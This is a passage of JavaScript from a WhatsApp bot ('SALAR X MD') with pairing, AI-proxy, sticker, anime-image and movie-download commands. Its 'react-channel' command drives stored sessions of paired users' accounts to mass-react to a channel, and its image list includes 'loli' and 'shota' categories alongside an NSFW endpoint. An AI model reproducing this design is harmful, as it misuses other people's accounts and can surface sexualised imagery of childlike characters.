                    `🔢 ${acc.number}\n\n` +
                    `📝 ${acc.note || '—'}`);
            }
                break;

            // ==================== PAIRING COMMANDS FOR WHATSAPP BOT ====================

            case 'pair': {
                await devtrust.sendMessage(m.chat, { react: { text: '🔗', key: m.key } });

                if (!q) return reply(`📌 *Usage:* pair 923xxxxxx`);

                let target = text.split("|")[0];
                let cleanNumber = target.replace(/[^0-9]/g, '');

                // Validate number
                if (!/^\d{7,15}$/.test(cleanNumber)) {
                    return reply("❌ *Invalid phone number format*");
                }

                // Check if number exists on WhatsApp
                try {
                    const contactInfo = await devtrust.onWhatsApp(cleanNumber + '@s.whatsapp.net');
                    if (!contactInfo || contactInfo.length === 0) {
                        return reply("❌ *Number not registered on WhatsApp*");
                    }
                } catch (e) {
                    console.log('WhatsApp check error:', e);
                }

                // Create pairing directory if it doesn't exist
                const WHATSAPP_PAIRING_DIR = './database/pairing/';
                if (!fs.existsSync(WHATSAPP_PAIRING_DIR)) {
                    fs.mkdirSync(WHATSAPP_PAIRING_DIR, { recursive: true });
                }

                // Send processing message
                const processingMsg = await devtrust.sendMessage(m.chat, addNewsletterContext({
                    text: `🔗 *Generating pairing code for +${cleanNumber}*\n⏳ Please wait...`
                }), { quoted: m });

                try {
                    // Load the pair module (same as Telegram bot)
                    const startPairing = require('./pair');
                    const jid = cleanNumber + '@s.whatsapp.net';

                    // Start pairing (this will generate code and save to file)
                    await startPairing(jid);

                    // Wait 4 seconds (same as Telegram bot)
                    await sleep(4000);

                    // Read the pairing file (same as Telegram bot)
                    const pairingFile = path.join(__dirname, 'nexstore', 'pairing', 'pairing.json');

                    if (!fs.existsSync(pairingFile)) {
                        throw new Error('Pairing file not found');
                    }

                    const cu = fs.readFileSync(pairingFile, 'utf-8');
                    const cuObj = JSON.parse(cu);
                    const pairingCode = cuObj.code;

                    if (!pairingCode) {
                        throw new Error('No code found in pairing file');
                    }

                    // Format the code nicely
                    let formattedCode = pairingCode;
                    if (!pairingCode.includes('-') && pairingCode.length > 4) {
                        formattedCode = pairingCode.match(/.{1,4}/g).join('-');
                    }

                    // Save pairing data to WhatsApp directory
                    const pairingData = {
                        jid: jid,
                        number: cleanNumber,
                        code: pairingCode,
                        timestamp: Date.now(),
                        date: new Date().toISOString(),
                        status: 'pending',
                        pairedBy: m.sender
                    };

                    fs.writeFileSync(
                        path.join(WHATSAPP_PAIRING_DIR, `${cleanNumber}@s.whatsapp.net.json`),
                        JSON.stringify(pairingData, null, 2)
                    );

                    // Delete processing message
                    await devtrust.sendMessage(m.chat, { delete: processingMsg.key });

                    // Send code (FIRST MESSAGE)
                    await devtrust.sendMessage(m.chat, addNewsletterContext({
                        text: `🔑 *YOUR PAIRING CODE*\n\n\`${formattedCode}\``
                    }), { quoted: m });

                    // Send instructions (SECOND MESSAGE)
                    const instructions = `📱 *Pairing Steps*\n\n` +
                        `1️⃣ Open WhatsApp on your phone\n` +
                        `2️⃣ Tap *⋮* (Menu) → Linked Devices\n` +
                        `3️⃣ Tap *Link a Device*\n` +
                        `4️⃣ Enter this code: \`${formattedCode}\`\n\n` +
                        `_⏱️ Code expires in 5 minutes_`;

                    await devtrust.sendMessage(m.chat, addNewsletterContext({ text: instructions }), { quoted: m });

                    // Send code again (THIRD MESSAGE)
                    await devtrust.sendMessage(m.chat, addNewsletterContext({
                        text: `${formattedCode}`
                    }), { quoted: m });

                } catch (error) {
                    console.error('Pairing error:', error);

                    // Delete processing message
                    await devtrust.sendMessage(m.chat, { delete: processingMsg.key });

                    // Send error message
                    await reply(`❌ *Pairing Failed*\n\n${error.message || 'Could not generate code. Try again later.'}`);
                }
            }
                break;

            case 'listpair': {
                // 🔓 Keep owner-only for security (lists ALL paired devices)
                if (!isCreator) return reply("🔒 *Owner only*");

                try {
                    const WHATSAPP_PAIRING_DIR = './database/pairing/';
                    const TELEGRAM_PAIRING_DIR = './nexstore/pairing/';
                    let allPairs = [];

                    // Read from WhatsApp pairing directory
                    if (fs.existsSync(WHATSAPP_PAIRING_DIR)) {
                        const files = fs.readdirSync(WHATSAPP_PAIRING_DIR);
                        for (const file of files) {
                            if (file.endsWith('.json')) {
                                try {
                                    const filePath = path.join(WHATSAPP_PAIRING_DIR, file);
                                    const data = JSON.parse(await fs.promises.readFile(filePath, 'utf-8'));
                                    allPairs.push({
                                        number: data.number || file.replace('.json', '').split('@')[0],
                                        date: data.date || new Date(fs.statSync(filePath).birthtime).toISOString(),
                                        status: data.status || 'unknown',
                                        pairedBy: data.pairedBy || 'unknown',
                                        source: 'whatsapp'
                                    });
                                } catch (e) {
                                    // If can't parse JSON, use filename
                                    const number = file.replace('.json', '').split('@')[0];
                                    allPairs.push({
                                        number: number,
                                        date: new Date(fs.statSync(path.join(WHATSAPP_PAIRING_DIR, file)).birthtime).toISOString(),
                                        status: 'unknown',
                                        pairedBy: 'unknown',
                                        source: 'whatsapp'
                                    });
                                }
                            }
                        }
                    }

                    // Read from Telegram pairing directory
                    if (fs.existsSync(TELEGRAM_PAIRING_DIR)) {
                        const files = fs.readdirSync(TELEGRAM_PAIRING_DIR);
                        for (const file of files) {
                            if (file === 'pairing.json') {
                                try {
                                    const filePath = path.join(TELEGRAM_PAIRING_DIR, file);
                                    const data = JSON.parse(await fs.promises.readFile(filePath, 'utf-8'));
                                    if (data.jid) {
                                        const number = data.jid.split('@')[0];
                                        // Avoid duplicates
                                        if (!allPairs.some(p => p.number === number)) {
                                            allPairs.push({
                                                number: number,
                                                date: data.date || new Date().toISOString(),
                                                status: data.code ? 'pending' : 'completed',
                                                pairedBy: 'telegram',
                                                source: 'telegram'
                                            });
                                        }
                                    }
                                } catch (e) { }
                            }
                        }
                    }

                    if (allPairs.length === 0) {
                        return reply(`📭 *No paired devices found*`);
                    }

                    // Sort by date (newest first)
                    allPairs.sort((a, b) => new Date(b.date) - new Date(a.date));

                    let pairedList = `📱 *Paired Devices*\n\n`;
                    pairedList += `Total: ${allPairs.length}\n\n`;

                    allPairs.forEach((pair, index) => {
                        const dateStr = new Date(pair.date).toLocaleString();
                        const statusEmoji = pair.status === 'pending' ? '⏳' : '✅';
                        pairedList += `${index + 1}. ${statusEmoji} *${pair.number}*\n`;
                        pairedList += `   📅 ${dateStr}\n`;
                        if (pair.source === 'telegram') pairedList += `   🔷 Telegram\n`;
                        if (pair.pairedBy !== 'unknown' && pair.pairedBy !== 'telegram') {
                            const shortUser = pair.pairedBy.split('@')[0];
                            pairedList += `   👤 Paired by: @${shortUser}\n`;
                        }
                        pairedList += `\n`;
                    });

                    pairedList += `_Use .delpair [number] to remove_`;

                    reply(pairedList);

                } catch (err) {
                    console.error('Listpair error:', err);
                    reply(`❌ *Error:* ${err.message}`);
                }
            }
                break;

            case 'delpair': {
                // 🔓 REMOVED owner-only check - Users can delete their own pairings
                // But we need to check if they're deleting their own or need owner for others

                if (!q) return reply(`📌 *Usage:* delpair 923xxxxxx`);

                const cleanNumber = q.replace(/[^0-9]/g, '');
                const WHATSAPP_PAIRING_DIR = './database/pairing/';
                const TELEGRAM_PAIRING_DIR = './nexstore/pairing/';
                let deleted = false;
                let message = '';
                let isOwnerDeleting = isCreator || isSudo; // Check if owner/sudo

                // Check if this number belongs to the user or if they're owner
                const userNumber = m?.sender?.split('@')?.[0] || 'User';
                const isOwnNumber = (userNumber === cleanNumber);

                if (!isOwnNumber && !isOwnerDeleting) {
                    return reply(`🔒 *You can only delete your own pairings*\nUse your own number: ${userNumber}`);
                }

                // Delete from WhatsApp pairing directory
                if (fs.existsSync(WHATSAPP_PAIRING_DIR)) {
                    try {
                        const files = fs.readdirSync(WHATSAPP_PAIRING_DIR);
                        const matchingFile = files.find(file =>
                            file.includes(cleanNumber)
                        );

                        if (matchingFile) {
                            const filePath = path.join(WHATSAPP_PAIRING_DIR, matchingFile);

                            // If not owner, check if this file belongs to them
                            if (!isOwnerDeleting) {
                                try {
                                    const data = JSON.parse(await fs.promises.readFile(filePath, 'utf-8'));
                                    const pairedBy = data.pairedBy || '';
                                    if (!pairedBy.includes(userNumber) && !pairedBy.includes(m.sender)) {
                                        return reply(`🔒 *This pairing doesn't belong to you*\nOnly the person who paired it or an owner can delete it.`);
                                    }
                                } catch (e) {
                                    // If can't read, only owners can delete
                                    if (!isOwnerDeleting) {
                                        return reply(`🔒 *Cannot verify ownership*\nAsk an owner to delete this.`);
                                    }
                                }
                            }

                            fs.unlinkSync(filePath);
                            deleted = true;
                            message += `✅ Removed from WhatsApp storage\n`;
                        }
                    } catch (err) {
                        console.error('Error deleting from WhatsApp dir:', err);
                    }
                }

                // Delete from Telegram pairing directory
                if (fs.existsSync(TELEGRAM_PAIRING_DIR) && isOwnerDeleting) {
                    try {
                        const pairingFilePath = path.join(TELEGRAM_PAIRING_DIR, 'pairing.json');
                        if (fs.existsSync(pairingFilePath)) {
                            const data = JSON.parse(await fs.promises.readFile(filePath, 'utf-8'));
                            if (data.jid && data.jid.includes(cleanNumber)) {
                                // Clear the data but keep file
                                fs.writeFileSync(pairingFilePath, JSON.stringify({}, null, 2));
                                message += `✅ Cleared from Telegram pairing\n`;
                                deleted = true;
                            }
                        }
                    } catch (err) {
                        console.error('Error deleting from Telegram dir:', err);
                    }
                }

                // Delete from owner.json if exists (only owners should modify this)
                if (isOwnerDeleting) {
                    const ownerPath = path.join(__dirname, 'allfunc', 'owner.json');
                    if (fs.existsSync(ownerPath)) {
                        try {
                            let ownerData = JSON.parse(fs.readFileSync(ownerPath, 'utf-8'));
                            const originalLength = ownerData.length;
                            ownerData = ownerData.filter(id =>
                                !id.includes(cleanNumber)
                            );
                            if (ownerData.length !== originalLength) {
                                fs.writeFileSync(ownerPath, JSON.stringify(ownerData, null, 2));
                                message += `✅ Removed from owner.json\n`;
                                deleted = true;
                            }
                        } catch (err) {
                            console.error('Error updating owner.json:', err);
                        }
                    }
                }

                // Delete session if exists (anyone can delete their own session)
                const SESSION_DIR = './𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗_storage/sessions/';
                if (fs.existsSync(SESSION_DIR)) {
                    try {
                        const sessionPath = path.join(SESSION_DIR, `${cleanNumber}@s.whatsapp.net`);
                        if (fs.existsSync(sessionPath)) {
                            fs.rmSync(sessionPath, { recursive: true, force: true });
                            message += `✅ Removed session\n`;
                            deleted = true;
                        }
                    } catch (err) {
                        console.error('Error deleting session:', err);
                    }
                }

                if (deleted) {
                    reply(`✅ *Pairing deleted for ${cleanNumber}*\n\n${message}`);
                } else {
                    reply(`❌ *No pairing found for ${cleanNumber}*`);
                }
            }
                break;

            case "gpt5": {
                const chatId = m.key.remoteJid;
                let query = args.join(" ").trim();

                try {
                    if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if (quoted.conversation) query = quoted.conversation;
                        else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
                    }

                    if (!query) return reply("🤖 *Usage:* gpt5 your question");

                    const res = await fetch(`https://apis.prexzyvilla.site/ai/gpt5?text=${encodeURIComponent(query)}`);
                    if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

                    const json = await res.json();
                    const answer = json?.result || "";

                    if (!answer) return reply("⚠️ *No response from GPT-5*");

                    const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? "🤖 *GPT-5*\n\n" : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *GPT-5 unavailable*");
                }
            }
                break;

            case "lyrics": {
                const chatId = m.key.remoteJid;
                const query = args.join(" ");

                if (!query) return reply("🎵 *Usage:* lyrics song title");

                try {
                    const res = await fetch(`https://apis.prexzyvilla.site/search/lyrics?title=${encodeURIComponent(query)}`);
                    const json = await res.json();

                    if (!json.status || !json.data || !json.data.lyrics) {
                        return reply(`❌ *Lyrics not found for "${query}"*`);
                    }

                    const { title, artist, album, lyrics } = json.data;
                    const chunks = lyrics.match(/[\s\S]{1,3500}/g) || [lyrics];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? `🎵 *${title}* – *${artist}*\n📀 ${album || 'Unknown'}\n\n` : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *Lyrics fetch failed*");
                }
            }
                break;

            case 'stickerthf':
            case 'steal':
            case 'stickerwm':
            case 'take':
            case 'wm': {
                // Check if quoting a message
                if (!m.quoted) {
                    return reply(`🎨 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Stealer*\n\nReply to a sticker with:\n${prefix}${command} PackName | Author\n\nExample: ${prefix}steal My Pack | My Name`);
                }

                // Check if it's a sticker
                if (!m.quoted.mimetype || !m.quoted.mimetype.includes('webp')) {
                    return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Stealer*\n\nThat's not a sticker. Reply to a sticker image.`);
                }

                try {
                    // Show loading reaction
                    await devtrust.sendMessage(m.chat, { react: { text: '🎨', key: m.key } });

                    // Parse packname and author
                    let packname = '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗';
                    let author = '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗';

                    if (text && text.includes('|')) {
                        let parts = text.split('|');
                        packname = parts[0]?.trim() || '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗';
                        author = parts[1]?.trim() || '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗';
                    } else if (text) {
                        packname = text;
                    }

                    // Download the sticker
                    let media = await m.quoted.download();

                    // Create sticker with exif
                    const { Sticker, StickerTypes } = require('wa-sticker-formatter');

                    let sticker = new Sticker(media, {
                        pack: packname,
                        author: author,
                        type: StickerTypes.FULL,
                        quality: 90,
                        background: '#FFFFFF00'
                    });

                    // Convert to buffer
                    let stickerBuffer = await sticker.toBuffer();

                    // Send the sticker
                    await devtrust.sendMessage(m.chat, {
                        sticker: stickerBuffer
                    }, { quoted: m });

                    // Success reaction
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Sticker error:', error);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 Sticker Stealer*\n\nSticker machine is jammed. Try again later.`);
                }
            }
                break;

            case 'react-channel': {
                if (!isCreator) {
                    return reply(`🔒 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nThis command is owner only.`);
                }

                const args = text.split(" ");
                if (args.length < 2) {
                    return reply(`📌 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nUsage: ${prefix}react-channel [emoji] [channel_link]\nExample: ${prefix}react-channel 👍 https://whatsapp.com/channel/123456/789`);
                }

                const emoji = args[0];
                const link = args[1];

                // Better regex for channel links
                const regex = /whatsapp\.com\/channel\/([0-9]+)(?:\/([0-9]+))?/;
                const match = link.match(regex);

                if (!match) {
                    return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nInvalid channel link. Please check the URL.`);
                }

                const channelId = match[1];
                const messageId = match[2];

                if (!messageId) {
                    return reply(`❌ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nMessage ID not found in the link.`);
                }

                const channelJid = `${channelId}@newsletter`;

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });

                    reply(`🔄 *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nSpreading ${emoji} to ${channelId}...`);

                    const pairedUsers = await loadUsers();

                    if (!pairedUsers || pairedUsers.length === 0) {
                        return reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nNo paired users found in the database.`);
                    }

                    let success = 0;
                    let failed = 0;
                    let errors = [];

                    for (const user of pairedUsers) {
                        try {
                            const session = getSession(user.id || user.jid || user.number + '@s.whatsapp.net');

                            // Try to send reaction
                            let sent = false;

                            if (session) {
                                try {
                                    await session.sendMessage(channelJid, {
                                        react: {
                                            text: emoji,
                                            key: {
                                                id: messageId,
                                                remoteJid: channelJid
                                            }
                                        }
                                    });
                                    sent = true;
                                    success++;
                                    console.log(`✅ React success for ${user.id || user.number}`);
                                } catch (sessionError) {
                                    console.log(`Session send failed for ${user.id}, trying main bot...`);
                                }
                            }

                            // If session failed, try main bot as fallback
                            if (!sent) {
                                try {
                                    await devtrust.sendMessage(channelJid, {
                                        react: {
                                            text: emoji,
                                            key: {
                                                id: messageId,
                                                remoteJid: channelJid
                                            }
                                        }
                                    });
                                    success++;
                                    console.log(`✅ React success via main bot for ${user.id || user.number}`);
                                    sent = true;
                                } catch (mainError) {
                                    throw new Error('Both session and main bot failed');
                                }
                            }

                            // Small delay to avoid rate limiting
                            await new Promise(resolve => setTimeout(resolve, 1000));

                        } catch (e) {
                            failed++;
                            errors.push(`User ${user.id || user.number}: ${e.message}`);
                            console.error(`React error for user ${user.id || user.number}:`, e.message);
                        }
                    }

                    const resultMessage = `✅ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React Complete*\n\n` +
                        `Emoji: ${emoji}\n` +
                        `Channel: ${channelId}\n` +
                        `Success: ${success}\n` +
                        `Failed: ${failed}`;

                    reply(resultMessage);

                    // Log errors if any (for debugging)
                    if (errors.length > 0 && failed > 0) {
                        console.log('React errors:', errors.slice(0, 3));
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Mass react error:', error);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                    reply(`⚠️ *𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗 React*\n\nReaction service is overloaded. Try again later.`);
                }
            }
                break;

            case "nsfw": {
                try {
                    const res = await axios.get("https://apis.prexzyvilla.site/random/anhnsfw");
                    const img = res.data?.message;
                    if (!img) return reply("❌ *Content unavailable*");

                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: img },
                            caption: "🔞 *NSFW Content*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("❌ *Failed to fetch content*");
                }
            }
                break;

            // Bulk anime image commands - all follow same pattern
            case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa':
            case 'boruto': case 'bts': case 'cecan': case 'chiho': case 'chitoge':
            case 'cogan': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri':
            case '𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗': case 'deidara': case 'doraemon': case 'elaina': case 'emilia':
            case 'erza': case 'exo': case 'femdom': case 'freefire': case 'gamewallpaper':
            case 'glasses': case 'gremory': case 'hacker': case 'hestia': case 'husbu':
            case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori':
            case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura':
            case 'kakashi': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki':
            case 'kotori': case 'kpop': case 'kucing': case 'kurumi': case 'lisa':
            case 'loli': case 'madara': case 'megumin': case 'mikasa': case 'mikey':
            case 'miku': case 'minato': case 'mobile': case 'motor': case 'mountain':
            case 'naruto': case 'neko': case 'neko2': case 'nekonime': case 'nezuko':
            case 'onepiece': case 'pentol': case 'pokemon': case 'profil': case 'programming':
            case 'pubg': case 'randblackpink': case 'randomnime': case 'randomnime2':
            case 'rize': case 'rose': case 'ryujin': case 'sagiri': case 'sakura':
            case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya':
            case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': {
                const baseUrl = 'https://apis.prexzyvilla.site/random/anime/';
                const endpoint = command; // command name matches API endpoint

                try {
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            image: { url: baseUrl + endpoint },
                            caption: `🎌 *${command.charAt(0).toUpperCase() + command.slice(1)}*`
                        }),
                        { quoted: m }
                    );
                } catch (err) {
                    reply(`❌ *Failed to fetch ${command} image*`);
                }
            }
                break;

            case 'toukachan': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/toukachan' },
                        caption: "🎌 *Touka-chan*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'tsunade': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/tsunade' },
                        caption: "🎌 *Tsunade*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'wfbbbu': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/waifu' },
                        caption: "✨ *Random Waifu*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'wallhp': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/wallhp' },
                        caption: "🖼️ *Wallpaper*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'wallml': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/wallml' },
                        caption: "🖼️ *Anime Wallpaper*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'wallmlnime': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/wallmlnime' },
                        caption: "🖼️ *Anime Wallpaper*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'yotsuba': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/yotsuba' },
                        caption: "🎌 *Yotsuba*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'yuki': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/yuki' },
                        caption: "🎌 *Yuki*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'yulibocil': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/yulibocil' },
                        caption: "🎌 *Yuli Bocil*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case 'yumeko': {
                await devtrust.sendMessage(m.chat,
                    addNewsletterContext({
                        image: { url: 'https://apis.prexzyvilla.site/random/anime/yumeko' },
                        caption: "🎌 *Yumeko*"
                    }),
                    { quoted: m }
                );
            }
                break;

            case "gemivbnni": {
                const chatId = m.key.remoteJid;
                let query = args.join(" ").trim();

                try {
                    if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if (quoted.conversation) query = quoted.conversation;
                        else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
                    }

                    if (!query) {
                        return reply("🤖 *Usage:* gemini your question");
                    }

                    const res = await fetch(`https://apis.prexzyvilla.site/ai/gemini?text=${encodeURIComponent(query)}`);
                    if (!res.ok) return reply(`⚠️ *API error ${res.status}*`);

                    const json = await res.json();
                    const answer = json?.data || "";

                    if (!answer) return reply("⚠️ *No response from Gemini*");

                    const chunks = answer.match(/[\s\S]{1,3000}/g) || [answer];

                    for (let i = 0; i < chunks.length; i++) {
                        const header = i === 0 ? "🤖 *Gemini*\n\n" : "";
                        await devtrust.sendMessage(chatId, addNewsletterContext({ text: header + chunks[i] }));
                    }
                } catch (err) {
                    console.error(err);
                    reply("⚠️ *Gemini unavailable*");
                }
            }
                break;

            // ============ MOVIE COMMANDS ============
            case 'movie2': {
                if (!text) return reply(`🎬 *Usage:* ${prefix + command} movie name`);

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
                    await reply(`🔍 *Searching for "${text}"...*`);

                    const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
                    const response = await axios.get(apiUrl);
                    const { status, result } = response.data;

                    if (!status || !result || result.movies.length === 0) {
                        return reply(`❌ *No movies found for "${text}"*`);
                    }

                    // Store results for THIS USER only
                    userMovieSessions[m.sender] = {
                        movies: result.movies,
                        timestamp: Date.now()
                    };

                    let movieList = `🎥 *Results for "${text}"*\n\n`;
                    result.movies.slice(0, 5).forEach((movie, index) => {
                        movieList += `${index + 1}. *${movie.title}*\n`;
                        movieList += `   ⭐ ${movie.imdb || 'N/A'} | 📅 ${movie.year || 'N/A'}\n\n`;
                    });

                    if (result.movies.length > 5) {
                        movieList += `_...and ${result.movies.length - 5} more_\n\n`;
                    }

                    movieList += `📌 *Select:* .selectmovie [number]`;

                    await reply(movieList);
                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Movie search error:', error);
                    reply(`❌ *Search failed* • Try again later`);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
            }
                break;

            case 'selectmovie': {
                if (!text) return reply(`🎬 *Usage:* selectmovie [number]`);

                const userSession = userMovieSessions[m.sender];
                if (!userSession || !userSession.movies || userSession.movies.length === 0) {
                    return reply(`❌ *No movies found. Use .movie command first*`);
                }

                const selectedIndex = parseInt(text.trim()) - 1;
                if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= userSession.movies.length) {
                    return reply(`❌ *Invalid number* • Choose 1-${userSession.movies.length}`);
                }

                const selectedMovie = userSession.movies[selectedIndex];
                const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
                    await reply(`🔍 *Fetching details for "${selectedMovie.title}"...*`);

                    const response = await axios.get(movieDetailsUrl);
                    const { status, result } = response.data;

                    if (!status || !result) return reply(`❌ *Failed to fetch details*`);

                    const movie = result.data;

                    // Store download links for THIS USER
                    userSession.selectedMovie = {
                        title: movie.title,
                        links: movie.dl_links || []
                    };

                    let movieInfo = `🎬 *${movie.title}*\n\n` +
                        `📅 ${movie.date || 'N/A'}\n` +
                        `🌍 ${movie.country || 'N/A'}\n` +
                        `⏳ ${movie.runtime || 'N/A'}\n` +
                        `⭐ ${movie.imdbRate || 'N/A'}/10\n\n` +
                        `📥 *Available Qualities*\n`;

                    if (movie.dl_links && movie.dl_links.length > 0) {
                        movie.dl_links.forEach((link, index) => {
                            movieInfo += `${index + 1}. ${link.quality || 'Unknown'} - ${link.size || 'N/A'}\n`;
                        });
                        movieInfo += `\n📌 *Download:* .dlmovie [number]`;
                    } else {
                        movieInfo += `No download links available`;
                    }

                    // Send poster if available
                    if (movie.image) {
                        await devtrust.sendMessage(m.chat,
                            addNewsletterContext({
                                image: { url: movie.image },
                                caption: movieInfo
                            }),
                            { quoted: m }
                        );
                    } else {
                        await reply(movieInfo);
                    }

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Movie details error:', error);
                    reply(`❌ *Failed to fetch movie details*`);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
            }
                break;

            case 'dlmovie': {
                if (!text) return reply(`📥 *Usage:* dlmovie [number]`);

                const userSession = userMovieSessions[m.sender];
                if (!userSession || !userSession.selectedMovie || !userSession.selectedMovie.links) {
                    return reply(`❌ *No movie selected. Use .selectmovie first*`);
                }

                const selectedIndex = parseInt(text.trim()) - 1;
                if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= userSession.selectedMovie.links.length) {
                    return reply(`❌ *Invalid number* • Choose 1-${userSession.selectedMovie.links.length}`);
                }

                const selectedLink = userSession.selectedMovie.links[selectedIndex]?.link;
                if (!selectedLink) return reply(`❌ *Download link not found*`);

                try {
                    await devtrust.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
                    await reply(`⏳ *Downloading "${userSession.selectedMovie.title}"...*\nQuality: ${selectedLink.quality || 'Unknown'}\nSize: ${selectedLink.size || 'Unknown'}`);

                    // Send as document
                    await devtrust.sendMessage(m.chat,
                        addNewsletterContext({
                            document: { url: selectedLink },
                            mimetype: 'video/mp4',
                            fileName: `${userSession.selectedMovie.title}.mp4`,
                            caption: `🎬 *${userSession.selectedMovie.title}*`
                        }),
                        { quoted: m }
                    );

                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

                } catch (error) {
                    console.error('Movie download error:', error);
                    reply(`❌ *Download failed* • Try again later`);
                    await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
                }
            }
                break;
            // =========================================

            case 'deepsjfkeek': {
                if (!text) return reply("🤖 *Usage:* deepseek your question");

                try {
                    const response = await axios.get(
                        `https://apis.prexzyvilla.site/ai/deepseek?text=${encodeURIComponent(text)}`
                    );

                    if (response.data && response.data.success) {
                        reply(`🤖 *DeepSeek*\n\n${response.data.result}`);
                    } else {
                        reply(`⚠️ *No response*`);
                    }
                } catch (error) {
                    console.error(error);
                    reply(`❌ *DeepSeek error*`);
                }
                break;
            }

            case "grovnnk-ai": {
                const chatId = m.key.remoteJid;
                let query = args.join(" ").trim();

                try {
                    if (!query && m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
                        const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                        if (quoted.conversation) query = quoted.conversation;
                        else if (quoted.extendedTextMessage?.text) query = quoted.extendedTextMessage.text;
                    }

                    if (!query) return reply("🤖 *Usage:* grok your question");

